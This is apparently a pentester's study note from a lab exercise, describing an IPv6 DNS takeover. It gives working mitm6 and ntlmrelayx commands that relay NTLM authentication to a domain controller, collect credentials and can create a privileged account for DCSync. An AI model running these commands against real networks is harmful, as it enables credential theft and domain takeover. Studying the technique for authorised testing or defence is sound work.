-- -
IPv6 is generally setup for every computer on the network, but since no one really uses it, it is not managed, maintained or used by anyone especially the SOC. So if you set yourself up as the DNS authority for IPv6 in the network, you can place yourself between users and the DC, allowing you to grab hashes and credentials from requests to authenticate to the DC. 
### Considerations
Only do this in short 5-10 minute bursts! You can easily break stuff and hold up the network this way. You can mimic DNS operations for simple stuff but the longer you stay up, the more traffic you get and the more likely you are to break normal operations, i.e. don't DoS your clients.
### Steps
1. Setup Relay
2. Setup mitm6
3. wait
### Setup Relay
Start running your NTLM Relay
```bash
impacket-ntlmrelayx -6 -t ldaps://<dc ip> -wh <wpad name>.<domain> -l <loot folder>
ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
```
### Setup mitm6
```bash
sudo mitm6 -d <domain>
sudo mitm6 -d marvel.local
```
### Waiting
Again, only do this for a few minutes, but you should (hopefully) get files in the loot folder you specified, in the example `lootme`. In this folder, you will have a few different files that show enumeration data taken from the attack. Can be domain accounts with descriptions which can have credentials in them, policies, groups, etc. 

If an admin logs in, you may get this attack to automatically create a user for you with specific ACLs attached to it that will allow juicy attacks like #DCSync. 